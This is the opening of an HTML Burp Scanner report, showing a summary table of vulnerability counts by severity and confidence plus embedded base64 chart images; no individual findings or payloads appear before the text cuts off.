ABwgYiGAkXHlFCFEkGkXTD2D+IICBADAwyG4v+hZjf8ztaIEM4bAZjQA7RhAdAAgVIkM3IUDAQQUtHDbIkIQUCcCR0UwoiFuDqLAgYwt0B0ANlHBVwKUFlPBVl2ExJJ0GhKAp3iD6AcCfSgEgohJ/ggghwJyGRCDpOyF4ICihgxiKqHeL9kRIcoWYwKgksR0jlAKYFrBMiUQYZxCdZ+Kn5n4y+pNIP0A8J4h1MaCkwqv4CLAaroLoGmGiPE00SA3SpFoImmdxKJBQhNywrFEhJKDvvhXkWKOLowpS6qnR5HkbuoUwIE2cmvXAgAsc5IgwuUSYyx3/whSqKwhU0QxGSALSaPtIsUN0EKIgIOBwb6e2EXKAo9HIADCM1MrZ1MEAyFwIxwC4e1kCBppEscVI9qoxESCLBcTSTBsoKCQkG0vECRisY1TLdkXji6g0m1rtzYb0w4EhC0WzoyMKR1MBEUNDeDGvGWsFs6cArIblQOxQkA6zJx4y9zVcT+u1zdfGbAjPPjcyQFRsS/OgkefCPWzSAARh+eWYB9EtsQIVkcGmVrOcCOWgoilA1wTHUzjcg6QNAMOOSDN225C/rWjcg/D8tCYkC0VDXbRZZggH7TYeTWeEvLAmsKqKFaTxACA/iAked01RENL4JUh9tReNuyDs1sxJ/++gh5411oOUfdQ8c5tJCPE1M48zAC0Q4iqshJDwww6UGjLCntGon+sYFCq3eW80hAAXAp53AFbJCy4ZAZ58xGKADWygggZoAZqi0ZQeiaUFU4mAdQYnv7BJAwigIoIJ4Ke6QZBgObVqwQIGABgdSOoH8wifdNAzAAUZEGPdAUL/kiQ7v9RgTy4Q2cjegzcveUoAfpkVEG5EQg6u7oTgKh6pssiQEJwNgGL5AZkOFbnbze0oZ4kBhiCAAAwRkHNM5FTWPAUB2NWAi9KQVOrAVgjcjFFthiABGPHxA5Pkior++CHchDCr3lgAj9NYwfOWGMe9OZFWCGCA9KZ3J2+oIP8Cy7Ni8wDAgQA0UgeJMMAKykOOBGxSEBGQyQmDIARF3o4IMSCPtPZSATzuoH6VSMUrhvmKWBhiFrawxSsPEYMNSIY6taAOMqvXx2iMjTAXtNsiFuBMAwRgmYUYgDMDwJhoCgKZ4JzFMmuwgRcEYHdoiecgxCbPetpzE/S8pz73GYl88vOfAMXZNQNK0ID6s6AI1edBE8rQhjr0oRCNqEQnSlFCZKABGMVoJS6aCR6wRxMZUGJFK1UADJjUpJqKRAcK8IBMoMABm3gADEaaCRbMdBA+QAG9HOGD9WjCozG9KU3TI1RB+AAHn3OECF6zT5kO9RI2NUQBfPCIpWIjqYv/cOpTKxFVl+GABx9QQAmKgAEW8OAAY8XADEBABBigoAAUiMsEWICBIiggqQS4gEkp4ICpnOABJkVBCdjTAREIwgYUqCtM5YICGmAAB5kahFtNyoIPEUGrW+VQUYngABS0FQcdyEAGSvDXC/CACB+YKhGsOjUM0OAAJ7hASw+AARhMZQKhJcIM7koEAijgtCz4ABFsgIEcEMEHFNBUA4ZAgVhMoAgznQAK2JoBGGDgc5jNLJZkCgMYOECvH7IuIXhQAKyWIC6sLcFOM4ABHhAAA4cYwkcJEVzdaqm3BTjAci07XM8aAgWGza52RzaDDhhYATBIKgwuQAgbzIAQKfAs/2tnYNhzfCADBbCBIYqwWPoKtwAnIEQRfLBcQvT0EBQQroAH3IiuGgIGLZUsgwfx3tUyFQVFKAIKcFwAGgw3sUWYQV+JMIEZFCDICmBPfYdQCBSkoMQ0hi9ac8xjFW+WxYxwcSFgXK/ZPNfGgqCAcRNxghRQYKdEaAAIZEuE+iJVxBOAMojg64AZhDjMVsYy1K4sCC4P4suDoAGDWfuADifiBiUCQRHaLFwnDwLDGGVylNvs40GgIM96doSWCeFnSy/2BEXQMGtTgAFjNiDJIEipIB7wW94KogQMrm8JZpDUDrRUzr2Fr4H/jAPhdgDNmVbEpiUbYxqjgAJ6TSlrOXtbABbQNS48mAEGLkDXC2D0Ac2+QBEoAFzhDmXaKLBzmiU9ZyLwQMcXmEGOhTsBDKBAw8FWxAnmW4gTGLMQE8jBfDNw2kE0QAQiuLMgyiyCfguiASkQwb2BKggeKBwVLqMqykQAggPwIKkHIABW483xjnv84yAPucgbGggAOw==" width="184" height="58"><h1>Burp Scanner Report</h1></div>
<h1>Summary</h1>
<span class="TEXT">The table below shows the numbers of issues identified in different categories. Issues are classified according to severity as High, Medium, Low or Information. This reflects the likely impact of each issue for a typical organization. Issues are also classified according to confidence as Certain, Firm or Tentative. This reflects the inherent reliability of the technique that was used to identify the issue.</span><br><br><table cellpadding="0" cellspacing="0" class="overview_table">
    <tr>
        <td width="70">&nbsp;</td>
        <td width="90">&nbsp;</td>
        <td colspan="4" height="40" align="center" class="label">Confidence</td>
    </tr>
    <tr>
        <td width="70">&nbsp;</td>
        <td width="90">&nbsp;</td>
        <td width="82" height="30" class="info">Certain</td>
        <td width="82" height="30" class="info">Firm</td>
        <td width="82" height="30" class="info">Tentative</td>
        <td width="82" height="30" class="info_end">Total</td>
    </tr>
    <tr>
        <td rowspan="4" valign="middle" class="label">Severity</td>
        <td class="info" height="30">High</td>
        <td class="colour_holder"><span class="colour_block high_certain">19</span></td>
        <td class="colour_holder"><span class="colour_block high_firm">5</span></td>
        <td class="colour_holder"><span class="colour_block high_tentative">0</span></td>
        <td class="colour_holder_end"><span class="colour_block row_total">24</span></td>
    </tr>
    <tr>
        <td class="info" height="30">Medium</td>
        <td class="colour_holder"><span class="colour_block medium_certain">16</span></td>
        <td class="colour_holder"><span class="colour_block medium_firm">0</span></td>
        <td class="colour_holder"><span class="colour_block medium_tentative">4</span></td>
        <td class="colour_holder_end"><span class="colour_block row_total">20</span></td>
    </tr>
    <tr>
        <td class="info" height="30">Low</td>
        <td class="colour_holder"><span class="colour_block low_certain">5</span></td>
        <td class="colour_holder"><span class="colour_block low_firm">2</span></td>
        <td class="colour_holder"><span class="colour_block low_tentative">0</span></td>
        <td class="colour_holder_end"><span class="colour_block row_total">7</span></td>
    </tr>
    <tr>
        <td class="info" height="30">Information</td>
        <td class="colour_holder"><span class="colour_block info_certain">37</span></td>
        <td class="colour_holder"><span class="colour_block info_firm">38</span></td>
        <td class="colour_holder"><span class="colour_block info_tentative">0</span></td>
        <td class="colour_holder_end"><span class="colour_block row_total">75</span></td>
    </tr>
</table><br>
<span class="TEXT">The chart below shows the aggregated numbers of issues identified in each category. Solid colored bars represent issues with a confidence level of Certain, and the bars fade as the confidence level falls.</span><br><br><table cellpadding="0" cellspacing="0" class="overview_table">
    <tr>
        <td width="70">&nbsp;</td>
        <td width="90">&nbsp;</td>
        <td colspan="9" height="40" align="center" class="label">Number of issues</td>
    </tr>
    <tr>
        <td width="70">&nbsp;</td>
        <td width="90">&nbsp;</td>
        <td width="83"><span class="grad_mark">0</span></td>
        <td width="83"><span class="grad_mark">10</span></td>
        <td width="83"><span class="grad_mark">20</span></td>
        <td width="83"><span class="grad_mark">30</span></td>
        <td width="83"><span class="grad_mark">40</span></td>
        <td width="83"><span class="grad_mark">50</span></td>
        <td width="83"><span class="grad_mark">60</span></td>
        <td width="83"><span class="grad_mark">70</span></td>
    </tr>
    <tr>
        <td rowspan="4" valign="middle" class="label">Severity</td>
        <td class="info">High</td>
        <td colspan="8" height="30">
            <table cellpadding="0" cellspacing="0"><tr><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPAAAPMqTAAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo2MUE2RjA3OTMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo2MUE2RjA3QTMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjYxQTZGMDc3MzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjYxQTZGMDc4MzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAALAAAAAABAAEAQAICRAEAOw==" width="158" height="16"></td><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAIAAAPmXpwAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo0OTM5RkM5NzMzQzExMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo0OTM5RkM5ODMzQzExMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjQ5MzlGQzk1MzNDMTExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjQ5MzlGQzk2MzNDMTExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAAIfkEAAAAAAAsAAAAAAEAAQAAAgJEAQA7" width="42" height="16"></td><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAIAAAP3a3wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo0OTM5RkM5QjMzQzExMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo0OTM5RkM5QzMzQzExMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjQ5MzlGQzk5MzNDMTExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjQ5MzlGQzlBMzNDMTExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAAIfkEAAAAAAAsAAAAAAEAAQAAAgJEAQA7" width="0" height="16"></td></tr></table>
        </td>
        <td>&nbsp;</td>
    </tr>
    <tr>
        <td class="info">Medium</td>
        <td colspan="8" height="30">
            <table cellpadding="0" cellspacing="0"><tr><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPAAAP9mMwAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo5NkRGMzMxMDMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo5NkRGMzMxMTMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjk2REYzMzBFMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjk2REYzMzBGMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAALAAAAAABAAEAQAICRAEAOw==" width="133" height="16"></td><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPAAAP+ymQAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo5NkRGMzMwQzMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo5NkRGMzMwRDMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjYxQTZGMDdGMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjYxQTZGMDgwMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAALAAAAAABAAEAAAICRAEAOw==" width="0" height="16"></td><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPAAAP/ZzAAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo2MUE2RjA3RDMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo2MUE2RjA3RTMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjYxQTZGMDdCMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjYxQTZGMDdDMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAALAAAAAABAAEAQAICRAEAOw==" width="34" height="16"></td></tr></table>
        </td>
        <td>&nbsp;</td>
    </tr>
    <tr>
        <td class="info">Low</td>
        <td colspan="8" height="30">
            <table cellpadding="0" cellspacing="0"><tr><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPAAAACU/wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpERDdCQTNGNTMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpERDdCQTNGNjMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjk2REYzMzE2MzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkREN0JBM0Y0MzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAALAAAAAABAAEAQAICRAEAOw==" width="42" height="16"></td><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPAAAH/J/wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo5NkRGMzMxNDMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo5NkRGMzMxNTMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjk2REYzMzEyMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjk2REYzMzEzMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5a